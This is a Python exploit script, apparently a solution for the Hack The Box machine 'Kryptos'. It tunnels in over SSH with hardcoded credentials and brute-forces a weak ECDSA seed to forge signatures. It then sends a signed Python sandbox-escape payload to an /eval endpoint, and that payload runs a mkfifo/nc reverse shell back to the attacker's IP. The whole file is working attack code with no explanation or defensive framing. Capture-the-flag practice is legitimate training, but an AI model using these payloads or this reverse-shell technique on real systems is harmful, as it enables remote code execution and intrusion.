#!/usr/bin/env python3

import binascii
import fcntl
import json
import requests
import socket
import struct
import sys
from ecdsa import VerifyingKey, SigningKey, NIST384p
from sshtunnel import SSHTunnelForwarder


# get local ip
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip = socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', b'tun0'))[20:24])
print(f"[*] Local IP: {ip}")

print("[*] Creating tunnel to Kryptos")
# Create tunnel
server = SSHTunnelForwarder(
    '10.10.10.129',
    ssh_username="rijndael",
    ssh_password="bkVBL8Q9HuBSpj",
    remote_bind_address=('127.0.0.1', 81)
)
server.start()
print(f"[+] Tunnel created, listening locally on port {server.local_bind_port}")

print(f"[*] Getting expression and signature from /debug")
try:
    resp = requests.get(f"http://127.0.0.1:{server.local_bind_port}/debug", timeout=3)
except requests.exceptions.ConnectionError:
    print(f"[-] Unable to connect to http://127.0.0.1:{server.local_bind_port}")
    server.stop()
    sys.exit(1)

debug = json.loads(resp.text)
sig = debug['response']['Signature']
expr = debug['response']['Expression']
print(f"[+] Signature and expression received")

def verify(msg, sig):
    try:
        return vk.verify(binascii.unhexlify(sig), msg)
    except:
        return False

seed_file = 'seeds.txt'
try:
    with open(seed_file, 'r') as f:
        seeds = f.read().split()
except IOError:
    print(f"[-] Unable to open {seed_file}. Create file with:")
    print("     ./gen_seeds.py | sort | uniq -c | sort -nr | awk '{print $2}' > seeds.txt")
    server.stop()
    sys.exit(1)

print("[*] Brute forcing seed")
for seed in seeds:
    rand = int(seed) + 1
    sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
    vk = sk.get_verifying_key()

    if verify(str.encode(expr), str.encode(sig)):
        break
print(f"[+] Found seed: {seed}")

# Re-write seeds file with seed at top
seeds.remove(seed)
with open(seed_file, 'w') as f:
    f.write('\n'.join([seed] + seeds))

rand = int(seed) + 1
sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)

def sign(msg):
    return binascii.hexlify(sk.sign(msg))

print("[*] Sending command to trigger reverse shell")
cmd = f"rm /tmp/d; mkfifo /tmp/d; cat /tmp/d|/bin/sh -i 2>&1|nc {ip} 443>/tmp/d"
expr = f"[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == \"catch_warnings\"][0]()._module.__builtins__[\"__import__\"](\"os\").system(\"{cmd}\")"
sig = sign(str.encode(expr)).decode()

try:
    resp = requests.post(f'http://127.0.0.1:{server.local_bind_port}/eval', json={"expr": expr, "sig": sig}, headers={"Content-Type": "application/json"}, proxies={"http": "http://127.0.0.1:8080"}, timeout=10)
except requests.exceptions.ReadTimeout:
    pass

server.stop()
